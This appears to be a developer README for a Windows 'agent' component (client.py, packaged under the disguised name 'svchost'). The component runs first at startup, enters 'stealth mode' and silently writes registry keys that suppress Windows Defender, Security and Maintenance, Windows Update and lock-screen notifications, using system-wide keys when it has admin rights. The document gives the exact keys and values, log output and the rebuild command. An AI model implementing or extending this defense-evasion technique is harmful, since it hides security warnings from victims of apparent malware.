# Windows Notification Disable Feature

## Overview
Added a comprehensive notification disable feature that runs **FIRST** before any other initialization when `client.py` starts.

## What Gets Disabled

The feature disables **7 types** of Windows notifications:

### 1. **Action Center Notifications**
- Registry: `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications`
- Setting: `ToastEnabled = 0`
- Effect: Disables all toast/popup notifications

### 2. **Notification Center**
- Registry: `HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer`
- Setting: `DisableNotificationCenter = 1`
- Effect: Completely disables the notification center

### 3. **Windows Defender Notifications**
- Registry: `HKCU\SOFTWARE\Microsoft\Windows Defender\UX Configuration`
- Setting: `Notification_Suppress = 1`
- Effect: Suppresses all Defender security notifications

### 4. **Toast Notifications (Lock Screen)**
- Registry: `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings`
- Settings:
  - `NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK = 0`
  - `NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK = 0`
- Effect: Disables notifications above lock screen

### 5. **System-Wide Notification Center** (if admin)
- Registry: `HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer`
- Setting: `DisableNotificationCenter = 1`
- Effect: Disables notification center for all users (requires admin)

### 6. **Windows Update Notifications**
- Registry: `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsUpdate`
- Setting: `Enabled = 0`
- Effect: Blocks Windows Update notifications

### 7. **Security and Maintenance Notifications**
- Registry: `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance`
- Setting: `Enabled = 0`
- Effect: Blocks Windows Security Center notifications

## Execution Flow

```
Start client.py
    ↓
[PRIORITY 1] Disable Windows Notifications
    ↓
Initialize stealth mode
    ↓
Continue with normal agent initialization
```

## Function Details

### `disable_windows_notifications()`
**Location:** Line ~3416 in `client.py`

**Returns:** 
- `True` if at least one notification setting was disabled
- `False` if all attempts failed

**Behavior:**
- Attempts all 7 notification disable operations
- Each operation is wrapped in try/except (failure of one doesn't stop others)
- Uses `HKEY_CURRENT_USER` for most settings (no admin required)
- Attempts `HKEY_LOCAL_MACHINE` only if admin privileges detected
- Logs detailed progress for each setting

## Registry Keys Modified

### Current User (HKCU) - No Admin Required:
```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications
HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer
HKCU\SOFTWARE\Microsoft\Windows Defender\UX Configuration
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsUpdate
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance
```

### System-Wide (HKLM) - Admin Required (Optional):
```
HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer
```

## Testing the Feature

### 1. Check if notifications are disabled:
```powershell
# Check Action Center
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled

# Check Notification Center
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter

# Check Defender notifications
reg query "HKCU\SOFTWARE\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress
```

### 2. Expected output:
```
ToastEnabled    REG_DWORD    0x0
DisableNotificationCenter    REG_DWORD    0x1
Notification_Suppress    REG_DWORD    0x1
```

### 3. Manual re-enable (if needed for testing):
```powershell
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /f
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /f
reg delete "HKCU\SOFTWARE\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress /f
```

## Advantages

1. **Runs First:** Executes before any other initialization
2. **Silent Operation:** No popups or prompts
3. **Non-Blocking:** Each setting is independent
4. **No Admin Required:** Most settings work without elevation
5. **Comprehensive:** Covers all major notification types
6. **Logged:** Detailed logging for troubleshooting

## Sample Log Output

```
[INFO] [STARTUP] Disabling Windows notifications...
[INFO] [NOTIFICATIONS] Disabling Windows notifications...
[INFO] [NOTIFICATIONS] Action Center notifications disabled (HKCU)
[INFO] [NOTIFICATIONS] Notification Center disabled (HKCU)
[INFO] [NOTIFICATIONS] Windows Defender notifications disabled (HKCU)
[INFO] [NOTIFICATIONS] Toast notifications disabled (HKCU)
[INFO] [NOTIFICATIONS] No admin privileges for system-wide settings
[INFO] [NOTIFICATIONS] Windows Update notifications disabled
[INFO] [NOTIFICATIONS] Security notifications disabled
[INFO] [NOTIFICATIONS] Notification disable completed: 6/7 settings applied
[INFO] [STARTUP] Notification disable completed
```

## Rebuilding

After making these changes, rebuild the executable:

```powershell
pyinstaller svchost.spec --clean --noconfirm
```

## Notes

- Changes take effect immediately (no restart required)
- Some notifications may require explorer.exe restart to fully apply
- System-wide settings (HKLM) only apply if running with admin privileges
- User can manually re-enable notifications through Windows Settings
- Does not affect critical system alerts (BSoD, hardware failures, etc.)

## Compatibility

- ✅ Windows 10 (all versions)
- ✅ Windows 11 (all versions)
- ⚠️ Windows 8/8.1 (partial support - some keys may not exist)
- ❌ Windows 7 (notification center doesn't exist)
